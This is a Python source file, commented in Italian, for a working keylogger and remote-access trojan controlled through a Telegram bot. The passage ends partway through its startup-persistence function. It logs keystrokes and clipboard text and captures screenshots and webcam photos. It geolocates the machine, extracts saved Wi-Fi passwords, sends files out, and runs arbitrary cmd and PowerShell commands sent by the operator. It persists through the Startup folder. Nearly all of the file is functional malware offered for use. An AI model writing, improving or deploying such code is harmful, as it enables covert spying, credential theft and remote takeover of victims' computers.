import os
import platform
import socket
import threading
import time
import tempfile
import cv2
import imageio
import requests
import pycountry
import sys
from datetime import datetime
from pynput import keyboard
import shutil
import pyperclip
import mss
import numpy as np
from cryptography.fernet import Fernet
import subprocess
import json
import sqlite3
import base64
try:
    import win32event
    import win32api
    import winerror
    import win32crypt
except ImportError:
    # Se pywin32 non è installato, il controllo non funzionerà ma lo script potrebbe comunque partire.
    win32event = None
    win32api = None
    winerror = None
    win32crypt = None

SECRET_KEY = b'aVuzD_TMheAHemOnvrBvkh8f4A3--rTBuf8ERiTV0nk='
ENCRYPTED_BOT_TOKEN = b''
ENCRYPTED_CHAT_ID = b''

print("[LOG] Avvio dello script.")
try:
    f = Fernet(SECRET_KEY)
    BOT_TOKEN = f.decrypt(ENCRYPTED_BOT_TOKEN).decode('utf-8')
    CHAT_ID = f.decrypt(ENCRYPTED_CHAT_ID).decode('utf-8')
    print("[LOG] Credenziali Telegram decriptate con successo.")
except Exception as e:
    print(f"Errore nella decrittografia delle credenziali: {e}")
    sys.exit(1)

# --- Impostazioni Globali ---
SEND_REPORT_EVERY = 180  # 3 minuti per keylogger
MAX_FILE_SIZE_MB = 100 # Limite per /getfile
print(f"[CONFIG] SEND_REPORT_EVERY: {SEND_REPORT_EVERY}s, MAX_FILE_SIZE_MB: {MAX_FILE_SIZE_MB}")

# --- Variabili di Stato Globali ---
log = ""
key_count = 0
session_start_time = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
previous_system_info = {}
shift_pressed = False
last_update_id = 0
camera_lock = threading.Lock()
stop_recording_event = threading.Event()
initial_info_sent = False
info_sending_lock = threading.Lock()

# --- Gestione ID Dispositivo ---
ID_STORAGE_DIR = os.path.join(os.getenv('LOCALAPPDATA'), '.services')
ID_FILE_PATH = os.path.join(ID_STORAGE_DIR, 'device.id')
MY_ID = ""

def setup_device_id():
    """Inizializza o legge l\'ID del dispositivo da un file."""
    global MY_ID
    print("[LOG] Inizio configurazione ID dispositivo...")
    try:
        if not os.path.exists(ID_STORAGE_DIR):
            os.makedirs(ID_STORAGE_DIR)
        
        # Controlla se il dispositivo è stato disinstallato
        if os.path.exists(ID_FILE_PATH):
            with open(ID_FILE_PATH, 'r') as f:
                content = f.read().strip()
            if content == "uninstalled":
                print("[LOG] Dispositivo contrassegnato come disinstallato. Uscita.")
                sys.exit(0)
            
            if content:
                MY_ID = content
                print(f"[LOG] ID dispositivo letto da file: {MY_ID}")
        
        # Se l\'ID non è stato caricato, ne genera uno nuovo
        if not MY_ID:
            print("[LOG] ID dispositivo non trovato o vuoto. Generazione nuovo ID dall\'hostname.")
            MY_ID = socket.gethostname()
            with open(ID_FILE_PATH, 'w') as f:
                f.write(MY_ID)
    except Exception as e:
        print(f"[ERROR] Impossibile impostare l\'ID del dispositivo: {e}")
        MY_ID = socket.gethostname() # Fallback
    print(f"[LOG] ID Dispositivo impostato a: {MY_ID}")

# --- Gestione Stato Directory ---
current_working_directory = os.getcwd()

def get_system_info():
    print("[LOG] Raccolta informazioni di sistema...")
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    system = platform.system()
    machine = platform.machine()
    processor = platform.processor()
    latitude, longitude, country_name, region, city = "N/A", "N/A", "N/A", "N/A", "N/A"
    try:
        response = requests.get('https://ipinfo.io/json', timeout=10)
        if response.status_code == 200:
            data = response.json()
            loc = data.get('loc', '').split(',')
            if len(loc) == 2:
                latitude, longitude = loc
            country_code = data.get('country', "N/A")
            region = data.get('region', "N/A")
            city = data.get('city', "N/A")
            if country_code != "N/A":
                try:
                    country_obj = pycountry.countries.get(alpha_2=country_code)
                    country_name = country_obj.name if country_obj else country_code
                    print(f"[GEO_LOG]Geolocalizzazione riuscita: {city}, {country_name}")
                except Exception as e_country:
                    country_name = country_code
    except requests.exceptions.RequestException as e:
        print(f"[GEO_ERROR] Impossibile ottenere informazioni di geolocalizzazione: {e}")
        pass
    return {"hostname": hostname, "ip_address": ip_address, "system": system, "machine": machine, "processor": processor, "latitude": latitude, "longitude": longitude, "country": country_name, "region": region, "city": city}

# --- Funzioni di Invio a Telegram ---
def ensure_initial_info():
    """Assicura che il report iniziale con le info di sistema sia inviato una sola volta."""
    global initial_info_sent, previous_system_info
    if not initial_info_sent:
        with info_sending_lock:
            # Controlla di nuovo dopo aver acquisito il lock, per evitare race condition
            if not initial_info_sent:
                print("[LOG] Primo invio rilevato: spedizione delle informazioni di sistema iniziali.")
                system_info = get_system_info()
                info_message = f'''*Dispositivo:* `{MY_ID}`
💻 *PC Info:*
Hostname: {system_info['hostname']}
IP: {system_info['ip_address']}
Sistema: {system_info['system']} {system_info['machine']}
Processore: {system_info['processor']}
📍 *Geolocalizzazione:*
Lat/Lon: {system_info['latitude']}, {system_info['longitude']}
Nazione: {system_info['country']}
Regione/Città: {system_info['region']}, {system_info['city']}'''
                
                # Invia il messaggio direttamente usando requests per evitare ricorsione infinita
                url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
                data = {'chat_id': CHAT_ID, 'text': info_message, 'parse_mode': 'Markdown'}
                try:
                    requests.post(url, data=data, timeout=10)
                    initial_info_sent = True  # Imposta il flag solo dopo un tentativo di invio
                except requests.exceptions.RequestException as e:
                    print(f"[TELEGRAM_ERROR] Eccezione durante l\'invio delle info iniziali: {e}")
                
                previous_system_info = system_info

def send_telegram_message(message):
    ensure_initial_info()
    print(f"[TELEGRAM_SEND] Invio messaggio: '{message[:70]}...'")
    # Aggiunto un log per l\'invio del messaggio
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
    try:
        requests.post(url, data=data, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"[TELEGRAM_ERROR] Eccezione durante l\'invio del messaggio: {e}")

def send_telegram_document(file_path, caption):
    ensure_initial_info()
    print(f"[TELEGRAM_SEND] Invio documento: {file_path}")
    # Aggiunto un log per l\'invio del documento
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
    with open(file_path, 'rb') as doc:
        files = {'document': doc}
        data = {'chat_id': CHAT_ID, 'caption': caption, 'parse_mode': 'Markdown'}
        try:
            response = requests.post(url, files=files, data=data, timeout=60)
            if response.status_code == 200:
                return True
            print(f"[TELEGRAM_ERROR] Errore invio documento: {response.status_code} - {response.text}")
            return False
        except requests.exceptions.RequestException as e:
            print(f"[TELEGRAM_ERROR] Eccezione durante l\'invio del documento: {e}")
            return False

def send_telegram_photo(photo_path, caption):
    ensure_initial_info()
    print(f"[TELEGRAM_SEND] Invio foto: {photo_path}")
    # Aggiunto un log per l\'invio della foto
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
    with open(photo_path, 'rb') as photo:
        files = {'photo': photo}
        data = {'chat_id': CHAT_ID, 'caption': caption, 'parse_mode': 'Markdown'}
        try:
            response = requests.post(url, files=files, data=data, timeout=30)
            if response.status_code == 200:
                return True
            print(f"[TELEGRAM_ERROR] Errore invio foto: {response.status_code} - {response.text}")
            return False
        except requests.exceptions.RequestException as e:
            print(f"[TELEGRAM_ERROR] Eccezione durante l\'invio della foto: {e}")
            return False


def send_telegram_video(video_path, caption):
    ensure_initial_info()
    print(f"[TELEGRAM_SEND] Invio video: {video_path}")
    # Aggiunto un log per l\'invio del video
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendVideo'
    with open(video_path, 'rb') as video:
        files = {'video': video}
        data = {'chat_id': CHAT_ID, 'caption': caption, 'parse_mode': 'Markdown'}
        try:
            response = requests.post(url, files=files, data=data, timeout=120) # Increased timeout for video
            if response.status_code == 200:
                return True
            print(f"[TELEGRAM_ERROR] Errore invio video: {response.status_code} - {response.text}")
            return False
        except requests.exceptions.RequestException as e:
            print(f"[TELEGRAM_ERROR] Eccezione durante l\'invio del video: {e}")
            return False


# --- Funzioni dei Comandi Remoti ---

def handle_uninstall():
    print("[CMD] Esecuzione /uninstall...")
    try:
        # Contrassegna come disinstallato per prevenire riavvii accidentali
        try:
            if not os.path.exists(ID_STORAGE_DIR):
                os.makedirs(ID_STORAGE_DIR)
            with open(ID_FILE_PATH, 'w') as f:
                f.write("uninstalled")
            print(f"[LOG] Contrassegnato come disinstallato nel file: {ID_FILE_PATH}")
        except Exception as e:
            # Logga l\'errore ma continua comunque a tentare la disinstallazione
            print(f"[ERROR] Impossibile contrassegnare come disinstallato: {e}")

        # Determina i percorsi necessari
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        
        if getattr(sys, 'frozen', False):
            # Il programma è un eseguibile compilato (es. PyInstaller)
            current_script_path = sys.executable
            script_filename = os.path.basename(current_script_path)
            startup_script_path = os.path.join(startup_folder, script_filename)
        else:
            # Il programma è uno script .py
            current_script_path = os.path.abspath(__file__)
            script_filename = os.path.basename(current_script_path).replace(".py", ".pyw")
            startup_script_path = os.path.join(startup_folder, script_filename)

        log_path = os.path.join(tempfile.gettempdir(), "uninstall_log.txt")

        # Contenuto dello script batch per la disinstallazione con logging
        batch_content = f'''@echo off
chcp 65001 > nul
set LOGFILE=\"{log_path}\" 

(echo [%%TIME%%] Inizio script di disinstallazione.) > %LOGFILE% 

(echo [%%TIME%%] Attesa di 5 secondi...) >> %LOGFILE%
timeout /t 5 /nobreak > NUL

set STARTUP_FILE=\"{startup_script_path}\" 
set SCRIPT_FILE=\"{current_script_path}\" 

(echo [%%TIME%%] File di avvio da eliminare: %STARTUP_FILE%) >> %LOGFILE%
if exist %STARTUP_FILE% (
    del /F /Q %STARTUP_FILE% >> %LOGFILE% 2>>&1
    if exist %STARTUP_FILE% (
        (echo [%%TIME%%] ERRORE: Impossibile eliminare il file di avvio.) >> %LOGFILE%
    ) else (
        (echo [%%TIME%%] SUCCESSO: File di avvio eliminato.) >> %LOGFILE%
    )
) else (
    (echo [%%TIME%%] INFO: File di avvio non trovato.) >> %LOGFILE%
)

(echo [%%TIME%%] Script principale da eliminare: %SCRIPT_FILE%) >> %LOGFILE%
if exist %SCRIPT_FILE% (
    del /F /Q %SCRIPT_FILE% >> %LOGFILE% 2>>&1
    if exist %SCRIPT_FILE% (
        (echo [%%TIME%%] ERRORE: Impossibile eliminare lo script principale.) >> %LOGFILE%
    ) else (
        (echo [%%TIME%%] SUCCESSO: Script principale eliminato.) >> %LOGFILE%
    )
) else (
    (echo [%%TIME%%] INFO: Script principale non trovato.) >> %LOGFILE%
)

(echo [%%TIME%%] Fine. Auto-eliminazione tra 15 secondi.) >> %LOGFILE%
timeout /t 15 /nobreak > NUL

del "%%~f0" > NUL 2>NUL
'''
        
        # Scrive e avvia lo script batch
        temp_dir = tempfile.gettempdir()
        batch_path = os.path.join(temp_dir, "uninstall_keylogger.bat")
        with open(batch_path, 'w', encoding='utf-8') as f:
            f.write(batch_content)
        
        send_telegram_message(f"✅ Disinstallazione avviata su `{MY_ID}`. Il dispositivo si disconnetterà a breve. Verrà creato un log di debug.")
        
        # Avvia il batch in un processo separato e non bloccante
        subprocess.Popen(['cmd.exe', '/c', batch_path], creationflags=subprocess.DETACHED_PROCESS, close_fds=True)
        
        # Termina lo script principale
        sys.exit(0)

    except Exception as e:
        error_message = f"❌ Errore durante la preparazione della disinstallazione su `{MY_ID}`: {e}"
        print(f"[CMD_ERROR] {error_message}")
        send_telegram_message(error_message)


def handle_rename(old_id, new_id):
    global MY_ID
    print(f"[CMD] Ricevuto comando /rename per '{old_id}' a '{new_id}'. ID attuale: '{MY_ID}'")
    if old_id.lower() == MY_ID.lower():
        try:
            with open(ID_FILE_PATH, 'w') as f:
                print(f"[CMD_LOG] Scrittura del nuovo ID '{new_id}' su {ID_FILE_PATH}")
                f.write(new_id)
            MY_ID = new_id
            send_telegram_message(f"✅ Dispositivo `{old_id}` rinominato in `{new_id}`.")
        except Exception as e:
            send_telegram_message(f"❌ Errore rinominando `{old_id}`: {e}")

def take_screenshot_and_send():
    print("[CMD] Esecuzione take_screenshot_and_send...")
    try:
        with mss.mss() as sct:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = os.path.join(tempfile.gettempdir(), f"screenshot_{timestamp}.png")
            sct_img = sct.grab(sct.monitors[1])
            mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)
            print(f"[CMD_LOG] Screenshot salvato in: {filename}")
            if send_telegram_photo(filename, f"Screenshot da `{MY_ID}`"):
                print(f"[CMD] Screenshot inviato: {filename}")
                os.remove(filename)
            else:
                print(f"[CMD] Invio screenshot fallito: {filename}")
    except Exception as e:
        send_telegram_message(f"❌ Errore screenshot su `{MY_ID}`: {e}")

def take_camerashot_and_send():
    print("[CMD] Esecuzione take_camerashot_and_send...")

    if camera_lock.locked():
        stop_recording_event.set()
        print("[CMD] Fotocamera occupata, inviato segnale di interruzione alla registrazione.")

    print("[CMD] In attesa del rilascio del lock della fotocamera...")
    if not camera_lock.acquire(timeout=15):
        send_telegram_message(f"❌ Timeout: Impossibile acquisire la fotocamera su `{MY_ID}` per scattare la foto.")
        stop_recording_event.clear()  # Resetta l\'evento se siamo andati in timeout
        return

    print("[CMD] Lock della fotocamera acquisito. Scatto la foto.")
    try:
        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW) # Usare CAP_DSHOW può essere più veloce/stabile su Windows
        if not camera.isOpened():
            send_telegram_message(f"❌ Impossibile accedere alla webcam su `{MY_ID}`.")
            return
        
        # Diamo alla camera un istante per inizializzarsi
        time.sleep(0.2) 
        
        ret, frame = camera.read()
        camera.release()
        
        if ret:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = os.path.join(tempfile.gettempdir(), f"camerashot_{timestamp}.jpg")
            cv2.imwrite(filename, frame)
            if send_telegram_photo(filename, f"Foto dalla webcam di `{MY_ID}`"):
                print(f"[CMD] Foto da webcam inviata: {filename}")
                os.remove(filename)
            else:
                print(f"[CMD] Invio foto da webcam fallito: {filename}")
        else:
            send_telegram_message(f"❌ Impossibile catturare foto dalla webcam su `{MY_ID}`.")
    except Exception as e:
        send_telegram_message(f"❌ Errore webcam su `{MY_ID}`: {e}")
    finally:
        stop_recording_event.clear()  # Resetta l\'evento, abbiamo finito con la fotocamera.
        camera_lock.release()
        print("[CMD] Foto scattata e fotocamera rilasciata.")

def handle_ls(path):
    global current_working_directory
    target_path = path if path else current_working_directory
    print(f"[CMD] Esecuzione /ls su percorso: '{target_path}'")
    try:
        if not os.path.isdir(target_path):
            send_telegram_message(f"❌ Percorso non valido o non è una directory: `{target_path}`")
            return
        
        items = os.listdir(target_path)
        if not items:
            send_telegram_message(f"📂 La cartella `{target_path}` è vuota.")
            return

        output = f"*Contenuto di `{target_path}`:*\n```\n"
        dirs = []
        files = []
        for item in items:
            item_path = os.path.join(target_path, item)
            if os.path.isdir(item_path):
                dirs.append(f"- {item}/\n")
            else:
                files.append(f"- {item}\n")
        
        output += "".join(dirs) + "".join(files)
        output += "```"
        send_telegram_message(output)

    except Exception as e:
        send_telegram_message(f"❌ Errore `ls` su `{MY_ID}`: {e}")


def handle_cd(path):
    global current_working_directory
    print(f"[CMD] Esecuzione /cd su percorso: '{path}'")
    # Aggiunto un log per il cambio di directory
    if os.path.isdir(path):
        current_working_directory = os.path.abspath(path)
        send_telegram_message(f"✅ Directory di lavoro cambiata in `{current_working_directory}`")
    else:
        send_telegram_message(f"❌ Percorso non trovato o non è una directory: `{path}`")

def handle_getfile(path):
    print(f"[CMD] Esecuzione /getfile su percorso: '{path}'")
    # Aggiunto un log per il recupero del file
    if not os.path.isfile(path):
        send_telegram_message(f"❌ File non trovato: `{path}`")
        return
    try:
        file_size = os.path.getsize(path) / (1024 * 1024)
        if file_size > MAX_FILE_SIZE_MB:
            send_telegram_message(f"❌ Il file `{os.path.basename(path)}` è troppo grande ({file_size:.2f} MB). Limite: {MAX_FILE_SIZE_MB} MB.")
            return
        
        send_telegram_message(f"✅ Invio del file `{os.path.basename(path)}` in corso...")
        send_telegram_document(path, f"File da `{MY_ID}`: `{path}`")
    except Exception as e:
        send_telegram_message(f"❌ Errore `getfile` su `{MY_ID}`: {e}")

def handle_shell_command(shell_type, command_to_run):
    print(f"[CMD] Esecuzione /{shell_type} con comando: '{command_to_run}'")
    
    if not command_to_run:
        send_telegram_message(f"❌ Manca il comando da eseguire per `/{shell_type}`.")
        return

    try:
        if shell_type == 'cmd':
            full_command = ['cmd.exe', '/c', command_to_run]
        elif shell_type == 'powershell':
            full_command = ['powershell.exe', '-Command', command_to_run]
        else:
            send_telegram_message(f"❌ Shell non supportata: `{shell_type}`.")
            return

        result = subprocess.run(
            full_command,
            capture_output=True,
            text=True,
            timeout=90,
            encoding='cp850',
            errors='ignore'
        )

        output = result.stdout + result.stderr

        if not output:
            output = "(Nessun output prodotto)"

        message = f"*Output del comando `{shell_type}` su `{MY_ID}`:*\n```\n{output[:3800]}\n```"
        send_telegram_message(message)
    except subprocess.TimeoutExpired:
        send_telegram_message(f"❌ Timeout! Il comando `/{shell_type}` su `{MY_ID}` ha impiegato più di 90 secondi per essere eseguito.")
    except Exception as e:
        send_telegram_message(f"❌ Errore durante l\'esecuzione di `/{shell_type}` su `{MY_ID}`: {e}")

def handle_help():
    print("[CMD] Invio del messaggio di aiuto.")
    help_message = '''*Ecco i comandi disponibili:*

`/devices`
Elenca tutti i dispositivi attivi.

`/rename <nome_attuale> <nuovo_nome>`
Rinomina un dispositivo.

`/sysinfo <id_dispositivo>`
Restituisce informazioni di sistema del dispositivo.

`/screenshot <id_dispositivo>`
Cattura uno screenshot.

`/camerashot <id_dispositivo>`
Scatta una foto dalla webcam.

`/ls <id_dispositivo> [percorso]`
Elenca i file in una directory.

`/cd <id_dispositivo> <percorso>`
Cambia la directory di lavoro.

`/getfile <id_dispositivo> <percorso_file>`
Scarica un file.

`/wifilist <id_dispositivo>`
Mostra l\'elenco delle reti Wi-Fi salvate e le loro password.

`/getwifi <id_dispositivo> <nome_wifi>`
Mostra la password di una rete Wi-Fi salvata.

`/cmd <id_dispositivo> <comando>`
Esegue un comando tramite il Prompt dei Comandi (cmd.exe).

`/powershell <id_dispositivo> <comando>`
Esegue un comando tramite PowerShell.

`/uninstall <id_dispositivo>`
Avvia il processo di disinstallazione del keylogger dal sistema.

`/help`
Mostra questo messaggio di aiuto.'''
    send_telegram_message(help_message)

def handle_wifilist():
    print("[CMD] Esecuzione /wifilist per nomi e password...")
    try:
        # --- Step 1: Get all profile names ---
        print("[WIFI_DEBUG] Esecuzione comando per ottenere i nomi dei profili...")
        profiles_result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'],
            capture_output=True, text=True, encoding='utf-8', errors='ignore', timeout=30
        )
        
        profile_names = []
        stdout_profiles = profiles_result.stdout
        print(f"[WIFI_DEBUG] Output nomi profili:\n{stdout_profiles}")

        for line in stdout_profiles.splitlines():
            if "All User Profile" in line or "Tutti i profili utente" in line:
                try:
                    name = line.split(":")[1].strip()
                    profile_names.append(name)
                except IndexError:
                    continue # Ignore parsing errors on this part
        
        print(f"[WIFI_DEBUG] Profili trovati: {profile_names}")

        if not profile_names:
            send_telegram_message(f"❌ Nessun profilo Wi-Fi trovato su `{MY_ID}`.")
            return

        # --- Step 2: Get password for each profile ---
        wifi_details = []
        for name in profile_names:
            print(f"[WIFI_DEBUG] Ottenimento dettagli per il profilo: '{name}'")
            try:
                command = ['netsh', 'wlan', 'show', 'profile', f'name=\"{name}\" ', 'key=clear']
                
                details_result = subprocess.run(
                    command,
                    capture_output=True, text=True, encoding='utf-8', errors='ignore', timeout=30
                )
                
                password = "N/A o Rete Aperta"
                for detail_line in details_result.stdout.splitlines():
                    if "Key Content" in detail_line or "Contenuto chiave" in detail_line:
                        password = detail_line.split(":")[1].strip()
                        break
                
                wifi_details.append({"name": name, "password": password})
                print(f"[WIFI_DEBUG] Dettagli: Nome='{name}', Password='{password}'")

            except Exception as e:
                print(f"[WIFI_ERROR] Errore nel recuperare i dettagli per '{name}': {e}")
                wifi_details.append({"name": name, "password": f"Errore nel recupero: {e}"})

        # --- Step 3: Format and send the report ---
        if not wifi_details:
            send_telegram_message(f"❌ Profili Wi-Fi trovati, ma impossibile recuperare i dettagli per `{MY_ID}`.")
            return

        message = f"📶 *Reti Wi-Fi e Password su `{MY_ID}`:*\n\n"
        for detail in wifi_details:
            message += f"🌐 *Rete:* `{detail['name']}`\n🔑 *Password:* `{detail['password']}`\n" + ("-"*20) + "\n"
            
        for i in range(0, len(message), 4000):
            send_telegram_message(message[i:i+4000])

    except Exception as e:
        error_msg = f"❌ Errore catastrofico durante l\'esecuzione di `/wifilist`: {e}"
        print(f"[CMD_ERROR] {error_msg}")
        send_telegram_message(error_msg)

def handle_getwifi(wifi_name):
    print(f"[CMD] Esecuzione /getwifi per la rete: '{wifi_name}'...")
    if not wifi_name:
        send_telegram_message("Sintassi: `/getwifi <id_dispositivo> <nome_wifi>`")
        return
    try:
        command = ['netsh', 'wlan', 'show', 'profile', f'name=\"{wifi_name}\" ', 'key=clear']
        result = subprocess.run(
            command, capture_output=True, text=True, encoding='cp850', errors='ignore', timeout=30
        )
        output = result.stdout
        if "not found" in output.lower() or "non trovato" in output.lower():
            send_telegram_message(f"❌ Profilo Wi-Fi `{wifi_name}` non trovato su `{MY_ID}`.")
            return
        ssid_name, password, auth_type, cipher = "N/A", "Nessuna (o rete aperta)", "N/A", "N/A"
        for line in output.split('\r\n'):
            if "SSID name" in line or "Nome SSID" in line:
                ssid_name = line.split(":")[1].strip().replace('"', '')
            elif "Key Content" in line or "Contenuto chiave" in line:
                password = line.split(":")[1].strip()
            elif "Authentication" in line or "Autenticazione" in line:
                auth_type = line.split(":")[1].strip()
            elif "Cipher" in line or "Crittografia" in line:
                cipher = line.split(":")[1].strip()
        message = f'''*Dettagli Wi-Fi per `{ssid_name}` su `{MY_ID}`:*
🔑 *Password:* `{password}`
🛡️ *Autenticazione:* {auth_type}
🔒 *Crittografia:* {cipher}
'''
        send_telegram_message(message)
    except subprocess.TimeoutExpired:
        send_telegram_message(f"❌ Timeout durante il recupero dei dettagli per `{wifi_name}` su `{MY_ID}`.")
    except Exception as e:
        send_telegram_message(f"❌ Errore durante l\'esecuzione di `/getwifi` per `{wifi_name}` su `{MY_ID}`: {e}")

# --- Funzione Principale di Gestione Comandi ---
def poll_commands():
    global last_update_id

    # Definisci il percorso per salvare l\'ID dell\'ultimo update
    UPDATE_ID_FILE_PATH = os.path.join(ID_STORAGE_DIR, 'update.id')

    # Carica l\'ID dell\'ultimo update da file all\'avvio
    try:
        if os.path.exists(UPDATE_ID_FILE_PATH):
            with open(UPDATE_ID_FILE_PATH, 'r') as f:
                content = f.read().strip()
                if content.isdigit():
                    last_update_id = int(content)
                    print(f"[LOG] ID dell\'ultimo update caricato da file: {last_update_id}")
    except Exception as e:
        print(f"[ERROR] Impossibile caricare l\'ID dell\'update: {e}")

    print("[LOG] Avvio del polling per i comandi Telegram.")
    while True:
        try:
            url = f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates'
            params = {'offset': last_update_id + 1, 'timeout': 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                data = response.json()
                if data['ok'] and data['result']:
                    for update in data['result']:
                        last_update_id = update['update_id']
                        
                        # Salva immediatamente il nuovo ID su file
                        try:
                            with open(UPDATE_ID_FILE_PATH, 'w') as f:
                                f.write(str(last_update_id))
                        except Exception as e:
                            print(f"[ERROR] Impossibile salvare l\'ID dell\'update: {e}")

                        print(f"[POLL] Ricevuto e salvato update: {update['update_id']}")
                        if 'message' in update and 'text' in update['message']:
                            handle_command(update['message'])
            elif response.status_code == 401:
                print("[CMD_ERROR] Errore di autorizzazione (401). Controlla il BOT_TOKEN.")
                time.sleep(300)
            else:
                print(f"[CMD_ERROR] Errore polling Telegram: {response.status_code} - {response.text}")
                time.sleep(60)

        except requests.exceptions.RequestException as e:
            print(f"[CMD_ERROR] Eccezione di rete durante il polling: {e}")
            time.sleep(60)
        except Exception as e:
            print(f"[CMD_ERROR] Errore non gestito nel loop di polling: {e}")
            time.sleep(60)
            
        time.sleep(1)

def handle_command(message):
    if 'text' not in message:
        return

    parts = message['text'].strip().split()
    print(f"[CMD] Parsing del comando: '{message['text']}'")
    command = parts[0].lower()

    if command == '/devices':
        send_telegram_message(f"Dispositivo `{MY_ID}` è attivo. ✅")
        return

    if command == '/help':
        handle_help()
        return

    if command == '/rename':
        if len(parts) == 3:
            handle_rename(parts[1], parts[2])
        else:
            send_telegram_message("Sintassi: `/rename <nome_attuale> <nuovo_nome>`")
        return

    # Da qui in poi, i comandi richiedono un ID dispositivo
    if len(parts) < 2:
        send_telegram_message(f"Specifica l\'ID del dispositivo per questo comando. Esempio: `{command} {MY_ID}`")
        return
    print(f"[CMD] Comando ricevuto per il dispositivo: {parts[1]}")

    target_id = parts[1]
    if target_id.lower() != MY_ID.lower():
        print(f"[CMD] Comando ignorato. Target: '{target_id}', Mio ID: '{MY_ID}'")
        return # Ignora comando per altri dispositivi

    # Esegui il comando specifico
    args = parts[2:]
    if command == '/uninstall':
        print("[CMD] Avvio procedura per /uninstall")
        handle_uninstall() # Termina lo script
    elif command == '/sysinfo':
        try:
            system_info = get_system_info()
            info_message = f'''*Dispositivo:* `{MY_ID}`
💻 *PC Info:*
Hostname: {system_info['hostname']}
IP: {system_info['ip_address']}
Sistema: {system_info['system']} {system_info['machine']}
Processore: {system_info['processor']}
📍 *Geolocalizzazione:*
Lat/Lon: {system_info['latitude']}, {system_info['longitude']}
Nazione: {system_info['country']}
Regione/Città: {system_info['region']}, {system_info['city']}'''
            send_telegram_message(info_message)
        except Exception as e:
            send_telegram_message(f"❌ Errore durante il recupero delle info di sistema per `{MY_ID}`: {e}")
    elif command == '/screenshot':
        print("[CMD] Avvio thread per /screenshot")
        threading.Thread(target=take_screenshot_and_send).start()
    elif command == '/camerashot':
        print("[CMD] Avvio thread per /camerashot")
        threading.Thread(target=take_camerashot_and_send).start()
    elif command in ['/cmd', '/powershell']:
        if args:
            shell_type = command.strip('/')
            command_to_run = ' '.join(args)
            threading.Thread(target=handle_shell_command, args=(shell_type, command_to_run)).start()
        else:
            send_telegram_message(f"Sintassi: `{command} <id_dispositivo> <comando_da_eseguire>`")
    elif command == '/ls':
        path = args[0] if args else ""
        print(f"[CMD] Esecuzione /ls con percorso: '{path or 'directory corrente'}'")
        handle_ls(path)
    elif command == '/cd':
        if args:
            print(f"[CMD] Esecuzione /cd con percorso: '{args[0]}'")
            handle_cd(args[0])
        else:
            send_telegram_message("Sintassi: `/cd <id_dispositivo> <percorso>`")
    elif command == '/getfile':
        if args:
            print(f"[CMD] Esecuzione /getfile con percorso: '{args[0]}'")
            handle_getfile(args[0])
        else:
            send_telegram_message("Sintassi: `/getfile <id_dispositivo> <percorso_file>`")
    elif command == '/wifilist':
        print("[CMD] Avvio thread per /wifilist")
        threading.Thread(target=handle_wifilist).start()
    elif command == '/getwifi':
        if args:
            wifi_name = ' '.join(args)
            print(f"[CMD] Avvio thread per /getwifi con nome: '{wifi_name}'")
            threading.Thread(target=handle_getwifi, args=(wifi_name,)).start()
        else:
            send_telegram_message("Sintassi: `/getwifi <id_dispositivo> <nome_wifi>`")

def on_press_key(key):
    global log, key_count, shift_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
        shift_pressed = True
        return
    char_to_add = None
    try:
        if hasattr(key, 'char') and key.char is not None:
            char_to_add = key.char.upper() if shift_pressed and key.char.isalpha() else key.char
        else:
            if key == keyboard.Key.enter:
                char_to_add = "\n"
            elif key == keyboard.Key.space:
                char_to_add = " "
            elif key == keyboard.Key.backspace and log:
                log = log[:-1]
    except AttributeError:
        pass
    if char_to_add:
        log += char_to_add
    key_count += 1

def on_release_key(key):
    global shift_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
        shift_pressed = False

def monitor_clipboard():
    previous_clipboard = ""
    print("[LOG] Avvio monitoraggio clipboard.")
    while True:
        try:
            current_clipboard = pyperclip.paste()
            # Aggiunto log per il contenuto copiato
            if current_clipboard and current_clipboard != previous_clipboard:
                
                message = f"\U0001F4CB *Testo copiato su `{MY_ID}`:*\n```{current_clipboard[:3000]}```"
                send_telegram_message(message)
                previous_clipboard = current_clipboard
        except Exception as e:
            print(f"[CLIPBOARD_ERROR] Errore durante il monitoraggio degli appunti: {e}")
        time.sleep(2)

def report():
    global log, key_count, previous_system_info
    print("[LOG] Esecuzione report periodico...")
    system_info = get_system_info()
    if system_info != previous_system_info:
        info_message = f'''*Dispositivo:* `{MY_ID}`\n\U0001F4BB *PC Info:*
Hostname: {system_info['hostname']}
IP: {system_info['ip_address']}
Sistema: {system_info['system']} {system_info['machine']}
Processore: {system_info['processor']}
\U0001F4CD *Geolocalizzazione:*
Lat/Lon: {system_info['latitude']}, {system_info['longitude']}
Nazione: {system_info['country']}
Regione/Città: {system_info['region']}, {system_info['city']}'''
        print("[LOG] Rilevate nuove informazioni di sistema. Invio in corso...")
        send_telegram_message(info_message)
        previous_system_info = system_info
    if log:
        message = f'*Dispositivo:* `{MY_ID}`\n\U0001F510 *LOG TASTI PREMUTI*\n(`{datetime.now().strftime("%H:%M:%S")}`, {key_count} tasti)\n```{log[:3500]}```'
        print(f"[LOG] Rilevati {key_count} nuovi tasti. Invio log in corso...")
        send_telegram_message(message)
        log = ""
        key_count = 0
    threading.Timer(SEND_REPORT_EVERY, report).start()

def add_to_startup():
    print("[LOG] Tentativo di aggiunta all\'avvio automatico...")
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    if getattr(sys, 'frozen', False):
        source_path = sys.executable
